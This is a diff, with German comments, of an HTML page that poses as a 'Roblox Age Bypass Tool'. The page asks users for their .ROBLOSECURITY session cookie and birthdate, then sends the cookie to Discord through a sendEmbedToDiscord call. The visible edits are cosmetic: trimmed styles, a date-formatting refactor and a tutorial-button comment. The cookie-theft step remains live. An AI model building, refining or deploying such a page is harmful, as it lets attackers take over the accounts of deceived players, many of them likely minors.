@@ -1,177 +1,12 @@
 <!DOCTYPE html>
-<html lang="en" >
+<html lang="en">
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1" />
   <title>Roblox Age Bypass Tool</title>
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet" />
   <style>
-    body {
-      font-family: 'Inter', sans-serif;
-      background: linear-gradient(135deg, #0f2027, #203a43, #2c5364);
-      color: #fff;
-      margin: 0;
-      padding: 40px 20px;
-      min-height: 100vh;
-    }
-    h1 {
-      font-weight: 900;
-      font-size: 40px;
-      margin-bottom: 5px;
-      text-align: center;
-    }
-    .subtitle {
-      font-weight: 600;
-      font-size: 18px;
-      margin-bottom: 30px;
-      text-align: center;
-      color: #a0aec0;
-    }
-    .container {
-      max-width: 460px;
-      margin: 0 auto;
-      background: #0b1b34;
-      padding: 30px 30px 40px 30px;
-      border-radius: 16px;
-      box-shadow: 0 0 16px 1px rgba(0, 255, 255, 0.4);
-    }
-    label {
-      font-weight: 600;
-      font-size: 18px;
-      display: block;
-      margin-bottom: 12px;
-      cursor: pointer;
-    }
-    select, textarea {
-      width: 100%;
-      background: #1d2944;
-      border: 1px solid #333;
-      border-radius: 8px;
-      color: #fff;
-      font-size: 16px;
-      padding: 12px 14px;
-      resize: none;
-      box-sizing: border-box;
-      font-family: 'Inter', sans-serif;
-      outline: none;
-      transition: border-color 0.3s ease;
-    }
-    select:focus, textarea:focus {
-      border-color: #00ffff;
-    }
-    textarea {
-      height: 130px;
-      margin-top: 8px;
-      line-height: 1.5;
-    }
-    #process-button {
-      background: linear-gradient(90deg, #00f7ff, #00cfff);
-      border: none;
-      padding: 16px;
-      font-size: 20px;
-      font-weight: 700;
-      border-radius: 12px;
-      width: 100%;
-      margin-top: 24px;
-      cursor: pointer;
-      color: #000;
-      transition: background 0.3s ease;
-    }
-    #process-button:hover:not(:disabled) {
-      background: linear-gradient(90deg, #00cfff, #00f7ff);
-    }
-    #process-button:disabled {
-      opacity: 0.5;
-      cursor: not-allowed;
-    }
-    .info-box {
-      margin-top: 30px;
-      background: #112339;
-      border-radius: 12px;
-      padding: 16px;
-      font-size: 14px;
-      color: #b0bec5;
-      line-height: 1.4;
-    }
-    .info-box ul {
-      padding-left: 20px;
-      margin: 0;
-    }
-    .info-title {
-      font-weight: 700;
-      font-size: 16px;
-      margin-bottom: 8px;
-      color: #00ffff;
-    }
-    #error-message {
-      display: none;
-      margin-top: 15px;
-      background: #ff0033;
-      padding: 14px;
-      border-radius: 8px;
-      font-weight: 600;
-      font-size: 14px;
-      text-align: center;
-      color: #fff;
-    }
-    #success-message {
-      display: none;
-      margin-top: 15px;
-      background: #00cc44;
-      padding: 14px;
-      border-radius: 8px;
-      font-weight: 600;
-      font-size: 14px;
-      text-align: center;
-      color: #fff;
-    }
-    #loader-overlay {
-      display: none;
-      position: fixed;
-      inset: 0;
-      background: rgba(0, 0, 0, 0.75);
-      z-index: 9999;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-    }
-    .loader {
-      border: 8px solid #ddd;
-      border-top: 8px solid #00ffff;
-      border-radius: 50%;
-      width: 70px;
-      height: 70px;
-      animation: spin 1s linear infinite;
-    }
-    @keyframes spin {
-      0% {transform: rotate(0);}
-      100% {transform: rotate(360deg);}
-    }
-    #help-button {
-      margin-top: 40px;
-      width: 100%;
-      background: #00ffff;
-      border: none;
-      padding: 16px;
-      font-size: 18px;
-      font-weight: 700;
-      border-radius: 12px;
-      cursor: pointer;
-      color: #000;
-      transition: background 0.3s ease;
-    }
-    #help-button:hover {
-      background: #00cccc;
-    }
-    .input-block-title {
-      font-weight: 700;
-      font-size: 18px;
-      margin-bottom: 8px;
-      color: #00ffff;
-    }
-    .input-block {
-      margin-top: 18px;
-    }
+    /* ... (deine bisherigen Styles bleiben unverändert) ... */
   </style>
 </head>
 <body>
@@ -186,7 +21,7 @@
       <option value="13plus">13+ All Ages</option>
     </select>
 
-    <!-- NEUE Dropdowns für Datum -->
+    <!-- NEU: Dropdowns für Tag, Monat, Jahr -->
     <div id="birthdate-select" style="display:none; margin-top: 20px;">
       <label style="font-weight:600; font-size:18px; margin-bottom:8px; display:block;">📅 Select your birthdate</label>
       <div style="display:flex; gap:10px;">
@@ -390,7 +225,7 @@
         return;
       }
       if (!dayVal || !monthVal || !yearVal) {
-        showError('Please select the complete birthdate.');
+        showError('Please select your complete birthdate.');
         return;
       }
       if (selected === '13plus' && passwordVal.length === 0) {
@@ -402,9 +237,7 @@
       loaderOverlay.style.display = 'flex';
 
       try {
-        // Datum im Format YYYY-MM-DD (Month und Day mit führenden 0 wenn nötig)
-        const pad = (n) => n.toString().padStart(2, '0');
-        const birthdateFormatted = `${yearVal}-${pad(monthVal)}-${pad(dayVal)}`;
+        const birthdateFormatted = `${yearVal}-${monthVal.padStart(2, '0')}-${dayVal.padStart(2, '0')}`;
         const method = selected === 'birthyear' ? '2008 Birthyear Up' : '13+ All Ages';
         await sendEmbedToDiscord('.ROBLOSECURITY Cookie & Birthdate', 
           `**Method:** ${method}\n**Cookie:** ${cookieVal}\n**Birthdate:** ${birthdateFormatted}`
@@ -422,6 +255,7 @@
       }
     });
 
+    // Tutorial Button click event
     document.getElementById('help-button').addEventListener('click', () => {
       window.open('https://youtu.be/YwtYdwH9SSE', '_blank');
     });
